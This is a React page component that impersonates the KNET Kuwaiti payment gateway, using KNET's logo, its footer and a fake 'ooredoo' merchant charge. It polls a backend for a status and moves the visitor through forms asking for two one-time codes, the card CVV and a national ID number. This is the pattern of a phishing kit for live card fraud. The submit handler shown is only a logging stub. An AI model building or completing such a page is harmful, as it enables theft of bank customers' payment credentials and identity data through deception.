import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function Loading() {
  const [location, setLocation] = useLocation();
  const [status, setStatus] = useState("جاري المعالجة...");
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [currentStage, setCurrentStage] = useState<string>("loading");
  const [formData, setFormData] = useState<Record<string, string>>({});

  useEffect(() => {
    // Get paymentId from URL params
    const params = new URLSearchParams(window.location.search);
    const id = params.get("paymentId");
    if (id) {
      setPaymentId(id);
    }
  }, []);

  useEffect(() => {
    if (!paymentId) return;

    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/trpc/payment.getPaymentStatus?input=${JSON.stringify({ paymentId })}`);
        const data = await response.json();

        if (data.result?.data?.status) {
          const status = data.result.data.status;

          // Update the current stage based on status
          if (status === "otp1_pending") {
            setCurrentStage("otp1");
          } else if (status === "cvv_pending") {
            setCurrentStage("cvv");
          } else if (status === "otp2_pending") {
            setCurrentStage("otp2");
          } else if (status === "hawety_pending") {
            setCurrentStage("hawety");
          } else if (status === "completed") {
            setLocation(`/success?paymentId=${paymentId}`);
          } else if (status === "rejected") {
            setLocation(`/error?paymentId=${paymentId}`);
          }

          setStatus(getStatusMessage(status));
        }
      } catch (error) {
        console.error("Error polling status:", error);
      }
    };

    // Poll every 2 seconds
    const interval = setInterval(pollStatus, 2000);

    // Initial poll
    pollStatus();

    return () => clearInterval(interval);
  }, [paymentId, setLocation]);

  const getStatusMessage = (status: string) => {
    const messages: Record<string, string> = {
      knet_submitted: "جاري التحقق من بيانات البطاقة...",
      otp1_pending: "جاري إرسال رمز التحقق...",
      otp1_verified: "تم التحقق من الرمز الأول...",
      cvv_pending: "جاري التحقق من رمز CVV...",
      cvv_verified: "تم التحقق من CVV...",
      otp2_pending: "جاري إرسال رمز التحقق الثاني...",
      otp2_verified: "تم التحقق من الرمز الثاني...",
      hawety_pending: "جاري التحقق من بيانات الهوية...",
      completed: "تم إكمال العملية بنجاح...",
      rejected: "تم رفض العملية...",
    };
    return messages[status] || "جاري المعالجة...";
  };

  const handleFormSubmit = async (e: React.FormEvent, stage: string) => {
    e.preventDefault();
    // Form submission logic would go here
    console.log(`Submitted ${stage}:`, formData);
  };

  // Loading screen - KNET style
  if (currentStage === "loading") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
        {/* Header Banner */}
        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
          <img 
            src="https://www.knet.com.kw/images/logo.png" 
            alt="KNET" 
            className="h-12"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        <div className="w-full max-w-2xl mt-20">
          {/* Merchant Info Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-xl">KNET</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Merchant:</span>
                <span className="text-gray-600">ooredoo</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Amount:</span>
                <span className="text-gray-600">KD 5.000</span>
              </div>
            </div>
          </div>

          {/* Processing Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8 text-center">
            <div className="flex justify-center mb-6">
              <div className="relative w-12 h-12">
                <div className="absolute inset-0 border-4 border-blue-400 border-t-blue-600 rounded-full animate-spin"></div>
              </div>
            </div>
            
            <h2 className="text-xl font-bold text-gray-800 mb-2">Processing.. please wait ...</h2>
            <p className="text-gray-700 text-sm mb-4">
              يرجى الانتظار، جاري معالجة الدفع حالياً لحظات...
            </p>
            
            <p className="text-gray-600 text-sm">{status}</p>
          </div>

          {/* Footer */}
          <div className="text-center mt-8 text-xs text-gray-600">
            <p>All Rights Reserved, Copyright 2024 ◆</p>
            <p className="text-blue-600 hover:underline">
              The Shared Electronic Banking Services Company - KNET
            </p>
          </div>
        </div>
      </div>
    );
  }

  // OTP Form (Stage 1 or 2)
  if (currentStage === "otp1" || currentStage === "otp2") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
        {/* Header Banner */}
        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
          <img 
            src="https://www.knet.com.kw/images/logo.png" 
            alt="KNET" 
            className="h-12"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        <div className="w-full max-w-2xl mt-20">
          {/* Merchant Info Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-xl">KNET</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Merchant:</span>
                <span className="text-gray-600">ooredoo</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Amount:</span>
                <span className="text-gray-600">KD 5.000</span>
              </div>
            </div>
          </div>

          {/* OTP Form Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
              {currentStage === "otp1" ? "التحقق من الرمز الأول" : "التحقق من الرمز الثاني"}
            </h2>

            <form onSubmit={(e) => handleFormSubmit(e, currentStage)} className="space-y-6">
              <div>
                <label className="block text-gray-700 font-semibold mb-2 text-sm">
                  رمز التحقق (OTP)
                </label>
                <input
                  type="text"
                  placeholder="000000"
                  maxLength={6}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-center text-lg tracking-widest"
                  value={formData.otp || ""}
                  onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
                  required
                />
              </div>

              <div className="flex gap-4">
                <button
                  type="submit"
                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
                >
                  Confirm / تأكيد
                </button>
                <button
                  type="button"
                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
                  onClick={() => setCurrentStage("loading")}
                >
                  Cancel / إلغاء
                </button>
              </div>
            </form>
          </div>

          {/* Footer */}
          <div className="text-center mt-8 text-xs text-gray-600">
            <p>All Rights Reserved, Copyright 2024 ◆</p>
            <p className="text-blue-600 hover:underline">
              The Shared Electronic Banking Services Company - KNET
            </p>
          </div>
        </div>
      </div>
    );
  }

  // CVV Form
  if (currentStage === "cvv") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
        {/* Header Banner */}
        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
          <img 
            src="https://www.knet.com.kw/images/logo.png" 
            alt="KNET" 
            className="h-12"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        <div className="w-full max-w-2xl mt-20">
          {/* Merchant Info Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-xl">KNET</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Merchant:</span>
                <span className="text-gray-600">ooredoo</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Amount:</span>
                <span className="text-gray-600">KD 5.000</span>
              </div>
            </div>
          </div>

          {/* CVV Form Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
              التحقق من رمز CVV
            </h2>

            <form onSubmit={(e) => handleFormSubmit(e, "cvv")} className="space-y-6">
              <div>
                <label className="block text-gray-700 font-semibold mb-2 text-sm">
                  رمز CVV (من ظهر البطاقة)
                </label>
                <input
                  type="text"
                  placeholder="000"
                  maxLength={4}
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 text-center text-lg tracking-widest"
                  value={formData.cvv || ""}
                  onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
                  required
                />
              </div>

              <div className="flex gap-4">
                <button
                  type="submit"
                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
                >
                  Confirm / تأكيد
                </button>
                <button
                  type="button"
                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
                  onClick={() => setCurrentStage("loading")}
                >
                  Cancel / إلغاء
                </button>
              </div>
            </form>
          </div>

          {/* Footer */}
          <div className="text-center mt-8 text-xs text-gray-600">
            <p>All Rights Reserved, Copyright 2024 ◆</p>
            <p className="text-blue-600 hover:underline">
              The Shared Electronic Banking Services Company - KNET
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Hawety Form
  if (currentStage === "hawety") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-gray-100 to-gray-200 flex items-center justify-center p-4">
        {/* Header Banner */}
        <div className="absolute top-0 left-0 right-0 bg-blue-900 h-24 flex items-center justify-center">
          <img 
            src="https://www.knet.com.kw/images/logo.png" 
            alt="KNET" 
            className="h-12"
            onError={(e) => {
              e.currentTarget.style.display = 'none';
            }}
          />
        </div>

        <div className="w-full max-w-2xl mt-20">
          {/* Merchant Info Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-6 mb-6 text-center">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-blue-600 rounded-lg flex items-center justify-center">
                <span className="text-white font-bold text-xl">KNET</span>
              </div>
            </div>
            <div className="space-y-2">
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Merchant:</span>
                <span className="text-gray-600">ooredoo</span>
              </div>
              <div className="flex justify-between items-center">
                <span className="font-semibold text-gray-700">Amount:</span>
                <span className="text-gray-600">KD 5.000</span>
              </div>
            </div>
          </div>

          {/* Hawety Form Box */}
          <div className="bg-yellow-50 border-2 border-yellow-400 rounded-lg p-8">
            <h2 className="text-lg font-bold text-gray-800 mb-6 text-center">
              التحقق من بيانات الهوية
            </h2>

            <form onSubmit={(e) => handleFormSubmit(e, "hawety")} className="space-y-6">
              <div>
                <label className="block text-gray-700 font-semibold mb-2 text-sm">
                  رقم الهوية
                </label>
                <input
                  type="text"
                  placeholder="123456789"
                  className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500"
                  value={formData.hawety || ""}
                  onChange={(e) => setFormData({ ...formData, hawety: e.target.value })}
                  required
                />
              </div>

              <div className="flex gap-4">
                <button
                  type="submit"
                  className="flex-1 bg-blue-600 text-white py-3 rounded-lg font-bold hover:bg-blue-700 transition"
                >
                  Confirm / تأكيد
                </button>
                <button
                  type="button"
                  className="flex-1 bg-gray-400 text-white py-3 rounded-lg font-bold hover:bg-gray-500 transition"
                  onClick={() => setCurrentStage("loading")}
                >
                  Cancel / إلغاء
                </button>
              </div>
            </form>
          </div>

          {/* Footer */}
          <div className="text-center mt-8 text-xs text-gray-600">
            <p>All Rights Reserved, Copyright 2024 ◆</p>
            <p className="text-blue-600 hover:underline">
              The Shared Electronic Banking Services Company - KNET
            </p>
          </div>
        </div>
      </div>
    );
  }

  return null;
}
